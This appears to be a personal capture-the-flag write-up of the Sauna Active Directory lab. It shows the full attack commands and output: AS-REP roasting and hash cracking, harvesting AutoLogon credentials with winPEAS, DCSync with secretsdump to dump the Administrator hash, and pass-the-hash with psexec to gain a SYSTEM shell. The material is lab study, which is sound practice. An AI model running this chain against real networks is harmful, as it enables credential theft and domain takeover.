## Sauna

### Lab Details 

- Difficulty: Easy
- Type: Web Enumeration, BloodHound, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-26 22:57:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
```
#### Initial Foothold 
 - enumerate the web application running on port 80
 - we found an about page that shows team members in the organization 
![[team members.png]]
- we can use [name generator](https://github.com/urbanadventurer/username-anarchy) to generate AD like usernames
```bash
## gathered from website team.html page
$ cat ~/my_data/users
Fergus Smith
Shaun Coins
Sophie Driver
Bowie Taylor
Hugo Bear
Steven Kerb

$ ./username-anarchy --input-file ~/my_data/users 
fergus
fergussmith
fergus.smith
<snip>
```
- we can attempt an ASREPRoasting attack o extract a hash from user accounts that do not require pre-authentication
```bash
$ while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.129.95.180 >> hashes.txt; done < ./ad_users.txt 
$ cat hashes.txt 
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
<snip>
[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:abec25ae9aeaafa4549462fa94499cd1$e16e52253d69cd7bfc7b6791a51d85013fa445dc94530fa07807256c8fe07385aa78fc4d6b8711f492053bcac4bd1a7e61bd85dacb9a78b36e391180f6fb86c826d4e2b5910eb0bb30c482bb14142552b840701073b7ddd0e9870268722f50de713a2c5932960feb17958b1d92618ecada399aad4eaeed7d52f92b856fd5b18b3a5486e43678a3faf18c16e5147dec7e95e1994e5b73054661830dc1712f150c376a1d6796b33fc2b55950d3d37b3b8b1964878efa37107de5a575be601923980d186e4163a23bf0254714270fce9b13e173e256e32be2d76945d3ef83b180de9836c048bda359c6a1f43315173dd51c43fc0722d725f5c08ee6b6edfaa9e94e
```
- decrypt the hash using `hashcat`
```bash
hashcat -m 18200 fsmith /usr/share/wordlists/rockyou.txt --force
```
- get reverse shell using `evil-winrm`
#### Lateral Movement (If any)

#### Privilege Escalation
- load and run `winPEASx64.exe`
- from the output we see `AutoLogon crdential` fpr `svc_loanmanager`
```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

```
- we can use this credential to run `bloodhound`
```bash
$ bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.138.7 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (SAUNA.EGOTISTICAL-BANK.LOCAL:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 00S

$ ls
20250926163522_computers.json   20250926163522_domains.json  20250926163522_groups.json  20250926163522_users.json
20250926163522_containers.json  20250926163522_gpos.json     20250926163522_ous.json

$ zip bloodhound.zip *.json
  adding: 20250926163522_computers.json (deflated 76%)
  adding: 20250926163522_containers.json (deflated 93%)
  adding: 20250926163522_domains.json (deflated 79%)
  adding: 20250926163522_gpos.json (deflated 89%)
  adding: 20250926163522_groups.json (deflated 95%)
  adding: 20250926163522_ous.json (deflated 69%)
  adding: 20250926163522_users.json (deflated 92%)

## run bloodhound
$ bloodhound
```
- go to pre-build query and click principle to `DCSync` amd we see user `svc_loanmgr` has the right to perform `DCSync`
![[AD/Easy/Sauna/bloodhound.png]]
- run `secretsdump.py` against Administrator to get the `NTLM` hash
```bash
$ secretsdump.py egotistical-bank/svc_loanmgr@10.129.138.7 -just-dc-user Administrator
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up...
```
- pass the hash to get reverse shell as administrator 
```bash
$ impacket-psexec egotistical-bank.local/Administrator@10.129.138.7 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.138.7.....
[*] Found writable share ADMIN$
[*] Uploading file nUGpUxKA.exe
[*] Opening SVCManager on 10.129.138.7.....
[*] Creating service CtHx on 10.129.138.7.....
[*] Starting service CtHx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
#### Resources

#### Lesson Learned
